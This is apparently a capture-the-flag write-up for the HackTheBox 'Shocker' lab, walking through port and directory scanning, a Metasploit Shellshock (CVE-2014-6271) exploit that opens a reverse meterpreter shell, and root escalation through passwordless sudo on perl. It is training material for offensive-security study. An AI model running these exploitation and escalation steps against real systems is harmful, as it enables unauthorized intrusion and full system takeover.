---
cover: ../.gitbook/assets/Shocker.png
coverY: 263.1893333333333
layout:
  cover:
    visible: true
    size: hero
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Shocker

## Information

* Add a virtual host.

```bash
echo '10.10.10.56 shocker.htb' | sudo tee -a /etc/hosts
```

* Scan all ports & all services.

```bash
nmap -p- -T4 shocker.htb -o nmap-ports
nmap -p 80,2222 -sV -O shocker.htb -o nmap-services
```

* Enumerate the web server

```bash
gobuster dir -u http://shocker.htb/ -w /usr/share/wordlists/dirb/common.txt -o gobuster-common
```

* You find the folder `/cgi-bin/` try to find a file inside of it.

```bash
gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -x pl,cgi,sh -o gobuster-cgi-files
```

## Exploitation

* The CGI service is vulnerable to CVE-2014-6271

```
msf6> use exploit/multi/http/apache_mod_cgi_bash_env_exec
msf6> set RHOSTS shocker.htb
msf6> set TARGETURI /cgi-bin/
msf6> set LHOST tun0
msf6> set LPORT 1234
msf6> run
```

* You gain meterpreter access with **shelly**.

## PrivEsc

* Enumerate the sudo permissions of shelly.

```bash
shelly@target> cat /home/shelly/user.txt
shelly@target> sudo -l
```

* The binary `/usr/bin/perl` can be executed as root with no password.

```
shelly@target> sudo /usr/bin/perl -e "system('bash')"
```

And you gain the **root** access !
